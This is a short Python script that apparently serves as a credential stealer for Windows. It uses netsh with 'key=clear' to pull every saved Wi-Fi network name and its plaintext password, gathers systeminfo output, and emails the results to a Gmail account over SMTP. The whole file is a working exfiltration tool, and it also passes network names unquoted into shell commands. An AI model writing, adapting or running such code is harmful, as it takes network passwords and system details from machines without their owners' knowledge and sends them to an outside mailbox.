from threading import Thread
import subprocess
import smtplib
import time
import re





def capture_wifi():
    captured: list[str] = []
    capture_wifi: str = subprocess.run('netsh wlan show profiles', capture_output=True, shell=True).stdout.decode()
    wifi_name: str = re.findall(r'All User Profile     : (.*?)\r\n', capture_wifi)
    for each_one in wifi_name:
        capture_psk: str = subprocess.run(rf'netsh wlan show profile name={each_one} key=clear', capture_output=True, shell=True).stdout.decode()
        password: str = re.findall(r'Key Content            : (.*?)\r\n', capture_psk)
        if len(password) != 0:
            name_password = f'{each_one}: {password[0]}'
            captured.append(name_password)
    return captured

def systeminfo_captured():
    captured_info: str = subprocess.run(r'systeminfo', capture_output=True, shell=True).stdout.decode()
    return captured_info
    
    

def main():
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login('username@gmail.com', 'password') #don't use you gmail password, read README.md file first 

    systeminfo: str = systeminfo_captured()
    capturewifi: str = capture_wifi()
    message: str = f'system info: \n{systeminfo}\n\nwifi info: \n\n{capturewifi}'
    server.sendmail('username@gmail.com', 'username@gmail.com', message)


if __name__ == '__main__':
    start: float = time.perf_counter()
    main()

    end: float = time.perf_counter()
    print(f'operation took {round(end-start, 2)}s')

